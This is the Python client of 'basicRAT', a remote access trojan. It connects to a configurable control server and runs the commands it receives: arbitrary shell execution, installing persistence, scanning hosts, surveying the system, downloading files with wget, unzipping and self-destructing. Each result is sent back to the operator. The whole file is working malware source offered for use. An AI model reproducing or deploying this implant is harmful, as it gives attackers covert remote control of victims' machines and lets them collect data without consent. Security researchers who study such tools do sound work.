#!/usr/bin/env python

#
# basicRAT client
# https://github.com/vesche/basicRAT
#

import socket
import subprocess
import sys

from core import persistence, scan, survey, toolkit


# change these to suit your needs
HOST = 'localhost'
PORT = 1337


def main():
    # determine system platform
    plat = sys.platform
    if plat.startswith('win'):
        plat = 'win'
    elif plat.startswith('linux'):
        plat = 'nix'
    elif plat.startswith('darwin'):
        plat = 'mac'
    else:
        plat = 'unk'
    
    # connect to basicRAT server
    conn = socket.socket()
    conn.connect((HOST, PORT))
    # conn.setblocking(0)

    while True:
        # wait to receive data from server
        data = conn.recv(4096)

        # seperate data into command and action
        cmd, _, action = data.partition(' ')

        if cmd == 'execute':
            results = subprocess.Popen(action, shell=True,
                      stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                      stdin=subprocess.PIPE)
            results = results.stdout.read() + results.stderr.read()

        elif cmd == 'kill':
            conn.close()
            sys.exit(0)

        elif cmd == 'persistence':
            results = persistence.run(plat)

        elif cmd == 'scan':
            results = scan.single_host(action)

        elif cmd == 'survey':
            results = survey.run(plat)

        elif cmd == 'unzip':
            results = toolkit.unzip(action)

        elif cmd == 'wget':
            results = toolkit.wget(action)

        elif cmd == 'selfdestruct':
            conn.close()
            toolkit.selfdestruct(plat)

        conn.send(results)


if __name__ == '__main__':
    main()
